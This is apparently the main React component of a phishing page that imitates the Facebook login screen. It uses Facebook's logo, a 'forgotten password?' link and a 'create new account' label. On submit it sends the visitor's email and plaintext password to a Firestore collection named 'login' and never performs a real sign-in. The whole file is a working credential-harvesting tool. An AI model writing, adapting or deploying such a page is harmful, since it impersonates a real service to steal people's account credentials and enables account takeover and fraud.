import { collection, addDoc } from "firebase/firestore";
import React, { useState } from "react";
import "./App.css";
import db from "./firebase";

function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");;

  async function submit(e) {
    e.preventDefault();

    await addDoc(collection(db, "login"), {
      email: email,
      password: password,
    });

    setEmail("");
    setPassword("");
  };

  return (
    <div className="login-fb">
      <div className="info">
        <div className="image">
          <img alt="facebook-img" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" />
        </div>
        <form>
          <input
            className="email"
            type="text"
            placeholder="Email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <input
            className="password"
            type="text"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <button className="subm" type="submit" onClick={submit}>Login</button>
          <a href="/" className="forgot">forgotten password?</a>
          <div className="new">
            <p>create new account</p>
          </div>
        </form>
      </div>
    </div>
  );
}

export default App;
